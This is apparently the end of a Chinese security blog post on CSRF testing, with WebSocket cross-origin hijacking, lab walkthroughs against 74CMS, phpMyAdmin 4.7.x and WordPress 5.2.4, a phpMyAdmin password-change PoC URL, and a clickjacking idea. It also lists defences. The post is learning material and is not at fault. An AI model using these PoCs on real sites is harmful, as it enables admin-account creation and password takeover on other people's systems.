+&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;head&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;title&lt;/span&gt;&amp;gt;&lt;/span&gt;ws demo&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;title&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;meta&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;charset&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;utf8&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;head&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;undefined&quot;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;javascript&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; ws = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; WebSocket(&lt;span class=&quot;string&quot;&gt;&#39;ws://192.168.1.101:9999&#39;&lt;/span&gt;);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;javascript&quot;&gt;  ws.onopen = &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;javascript&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(&lt;span class=&quot;string&quot;&gt;&#39;client: ws connection is open&#39;&lt;/span&gt;);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;javascript&quot;&gt;    ws.send(&lt;span class=&quot;string&quot;&gt;&#39;hello&#39;&lt;/span&gt;);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;undefined&quot;&gt;  &amp;#125;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;javascript&quot;&gt;  ws.onmessage = &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;params&quot;&gt;e&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;javascript&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(&lt;span class=&quot;string&quot;&gt;&#39;client: received %s&#39;&lt;/span&gt;, e.data);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;undefined&quot;&gt;  &amp;#125;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;undefined&quot;&gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;监听服务端&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571478485.67.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;访问index.html发起请求，抓取数据包&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571478624.46.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;通过数据包可以看到，websocket通信要在http协议的基础上请求升级协议，升级的协议名为websocket,返回的数据包中说明了升级的协议以及正在连接的协议。&lt;/p&gt;
+&lt;p&gt;下图时通过websocket的通信过程&lt;img src=&quot;https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571478800.27.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;在碰到使用使用websocket通信的目标时，测试方法和CORS类似， 篡改Origin，发现没有对Origin进行验证，也可以跨域进行协议升级。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571478895.33.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;h3 id=&quot;跨域劫持测试：&quot;&gt;&lt;a href=&quot;#跨域劫持测试：&quot; class=&quot;headerlink&quot; title=&quot;跨域劫持测试：&quot;&gt;&lt;/a&gt;跨域劫持测试：&lt;/h3&gt;&lt;p&gt;poc如下：使用pocbox生成(如果时https协议的站点则需要将ws修改为wss)&lt;/p&gt;
+&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;meta charset=&lt;span class=&quot;string&quot;&gt;&quot;utf-8&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;ws_attack&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; ws = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; WebSocket(&lt;span class=&quot;string&quot;&gt;&quot;ws://192.168.1.101:9999&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ws.onopen = &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;evt&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        ws.send(&lt;span class=&quot;string&quot;&gt;&quot;asdfafasd&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ws.onmessage = &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;evt&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        alert(evt);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        ws.close();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ws_attack();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;&lt;span class=&quot;regexp&quot;&gt;/script&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&quot;https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571479086.26.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;触发&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571479187.67.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;防御：校验Origin头 ，websocket默认不校验&lt;/p&gt;
+&lt;h2 id=&quot;CSRF实战——74CMS&quot;&gt;&lt;a href=&quot;#CSRF实战——74CMS&quot; class=&quot;headerlink&quot; title=&quot;CSRF实战——74CMS&quot;&gt;&lt;/a&gt;CSRF实战——74CMS&lt;/h2&gt;&lt;h3 id=&quot;登录74CMS的后台进行添加管理员操作并抓包&quot;&gt;&lt;a href=&quot;#登录74CMS的后台进行添加管理员操作并抓包&quot; class=&quot;headerlink&quot; title=&quot;登录74CMS的后台进行添加管理员操作并抓包&quot;&gt;&lt;/a&gt;登录74CMS的后台进行添加管理员操作并抓包&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568876799.13.png&quot; alt=&quot;&quot;&gt;&lt;img src=&quot;https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568876817.8.png&quot; alt=&quot;&quot;&gt;&lt;img src=&quot;https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568876946.98.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;无token且服务端没有验证referer，直接生成POC测试&lt;/p&gt;
+&lt;h3 id=&quot;生成POC，添加管理账户&quot;&gt;&lt;a href=&quot;#生成POC，添加管理账户&quot; class=&quot;headerlink&quot; title=&quot;生成POC，添加管理账户&quot;&gt;&lt;/a&gt;生成POC，添加管理账户&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568877019.83.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;返回后台查看，发现用户已经添加成功&lt;img src=&quot;https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568877075.24.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;h3 id=&quot;使用添加的账号登录&quot;&gt;&lt;a href=&quot;#使用添加的账号登录&quot; class=&quot;headerlink&quot; title=&quot;使用添加的账号登录&quot;&gt;&lt;/a&gt;使用添加的账号登录&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568877183.91.png&quot; alt=&quot;&quot;&gt;&lt;img src=&quot;https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568877231.37.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;h2 id=&quot;CSRF实战——phpMyAdmin-4-7-x-XSRF-CSRF&quot;&gt;&lt;a href=&quot;#CSRF实战——phpMyAdmin-4-7-x-XSRF-CSRF&quot; class=&quot;headerlink&quot; title=&quot;CSRF实战——phpMyAdmin 4.7.x XSRF/CSRF&quot;&gt;&lt;/a&gt;CSRF实战——phpMyAdmin 4.7.x XSRF/CSRF&lt;/h2&gt;&lt;blockquote&gt;
+&lt;p&gt;环境半天打不开哦，直接截图了&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&quot;登录靶机&quot;&gt;&lt;a href=&quot;#登录靶机&quot; class=&quot;headerlink&quot; title=&quot;登录靶机&quot;&gt;&lt;/a&gt;登录靶机&lt;img src=&quot;https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568877618.55.png&quot; alt=&quot;&quot;&gt;&lt;/h3&gt;&lt;h3 id=&quot;利用SQL语句更新密码，构造POC&quot;&gt;&lt;a href=&quot;#利用SQL语句更新密码，构造POC&quot; class=&quot;headerlink&quot; title=&quot;利用SQL语句更新密码，构造POC&quot;&gt;&lt;/a&gt;利用SQL语句更新密码，构造POC&lt;/h3&gt;&lt;figure class=&quot;highlight sql&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;SET&lt;/span&gt; passsword=&lt;span class=&quot;keyword&quot;&gt;PASSWORD&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&#39;demos&#39;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;http://f1496b741e86dce4b2f79f3e839f977d.vsplate.me:19830/pma/sql.php?db=mysql&amp;amp;table=user&amp;amp;sql_query=&lt;span class=&quot;keyword&quot;&gt;SET&lt;/span&gt;%&lt;span class=&quot;number&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;keyword&quot;&gt;password&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;%&lt;span class=&quot;number&quot;&gt;20&lt;/span&gt;=%&lt;span class=&quot;number&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;keyword&quot;&gt;PASSWORD&lt;/span&gt;(%&lt;span class=&quot;number&quot;&gt;27&lt;/span&gt;demos%&lt;span class=&quot;number&quot;&gt;27&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;然后即可利用短域名伪装发送，在这种特定场景下，还可以利用SQL语句进行写shell。&lt;/p&gt;
+&lt;h2 id=&quot;CSRF实战——wordpress5-2-4&quot;&gt;&lt;a href=&quot;#CSRF实战——wordpress5-2-4&quot; class=&quot;headerlink&quot; title=&quot;CSRF实战——wordpress5.2.4&quot;&gt;&lt;/a&gt;CSRF实战——wordpress5.2.4&lt;/h2&gt;&lt;blockquote&gt;
+&lt;p&gt;在后台添加账户处存在csrf，可以利用此处漏洞诱导管理员点击添加管理员账户&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;没有referer和token、origin验证&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571716416.22.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;直接通过burp抓包生产CSRF-POC在浏览器测试&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571716515.04.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;结果如下&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571716543.41.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;h2 id=&quot;组合拳&quot;&gt;&lt;a href=&quot;#组合拳&quot; class=&quot;headerlink&quot; title=&quot;组合拳&quot;&gt;&lt;/a&gt;组合拳&lt;/h2&gt;&lt;blockquote&gt;
+&lt;p&gt;记录一些学习到的思路&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;CSRF结合XSS形成上下文漏洞，绕过限制&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;CSRF结合URL跳转绕过限制&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&lt;a href=&quot;https://gh0st.cn/archives/2018-04-28/1&quot;&gt;CSRF结合点击劫持拿下权限&lt;/a&gt;&lt;/p&gt;
+&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;这个思路比较有意思，首先有些平台会存在绑定第三方账号的功能，在已经登录的情况下，点击劫持伪造登录，诱导攻击者点击从而登录第三方账号(攻击者自己的账号),登录后iframe直接跳转到绑定的界面，然后劫持用户继续点击绑定，从而使得受害者在平台上绑定的第三方账号是攻击者注册的小号，从而利用这种思路劫持到受害者平台的权限。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&quot;总结&quot;&gt;&lt;a href=&quot;#总结&quot; class=&quot;headerlink&quot; title=&quot;总结&quot;&gt;&lt;/a&gt;总结&lt;/h2&gt;&lt;p&gt;CSRF的漏洞挖掘方式，在用户可以增删改(大多数情况)查(jsonp跨、flash跨域、cors跨域)，查看数据包中是否又token、目标表单是否又验证码、目标数据包是否验证了referer来源，json数据是否可以自定义callback函数、flash网站根目录下的crossdomain.xml 中的”access-from domain”是否为通配符、cors、websocket是否验证origin来源。&lt;/p&gt;
+&lt;h2 id=&quot;参考文章&quot;&gt;&lt;a href=&quot;#参考文章&quot; class=&quot;headerlink&quot; title=&quot;参考文章&quot;&gt;&lt;/a&gt;参考文章&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.freebuf.com/articles/web/118352.html&quot;&gt;https://www.freebuf.com/articles/web/118352.html&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/6128#toc-16&quot;&gt;https://xz.aliyun.com/t/6128#toc-16&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://www.vulnspy.com/?u=pmasa-2017-9&quot;&gt;https://vulnspy.com/?u=pmasa-2017-9&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/5871#toc-3&quot;&gt;https://xz.aliyun.com/t/5871#toc-3&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://c1h2e1.github.io/#&quot;&gt;https://c1h2e1.github.io/#&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://gh0st.cn/archives/2018-03-22/1&quot;&gt;https://gh0st.cn/archives/2018-03-22/1&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://gh0st.cn/archives/2019-03-20/1&quot;&gt;https://gh0st.cn/archives/2019-03-20/1&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/chyingp/p/websocket-deep-in.html&quot;&gt;https://www.cnblogs.com/chyingp/p/websocket-deep-in.html&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/5143&quot;&gt;JSONP绕过CSRF防护token &lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://gh0st.cn/archives/2018-08-01/1&quot;&gt;https://gh0st.cn/archives/2018-08-01/1&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://gh0st.cn/archives/2018-04-28/1&quot;&gt;https://gh0st.cn/archives/2018-04-28/1&lt;/a&gt; &lt;/p&gt;
+</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Demos</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">70.1k</span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">博客全站共70.1k字</span>
+</div>
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
